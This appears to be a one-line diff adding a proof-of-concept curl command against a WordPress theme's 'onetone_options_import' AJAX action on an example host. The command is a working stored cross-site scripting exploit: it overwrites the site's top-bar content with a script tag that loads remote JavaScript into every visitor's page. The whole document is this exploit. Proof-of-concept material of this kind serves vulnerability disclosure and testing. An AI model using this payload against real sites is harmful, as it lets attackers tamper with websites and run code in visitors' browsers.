@@ -1,0 +1,1 @@
+curl 'http://example.com/wp-admin/admin-ajax.php?action=onetone_options_import'--data 'options={"top_bar_info_content":"<script src='//127.0.0.1/script.js'><\/script>", "display_top_bar":"yes"}'
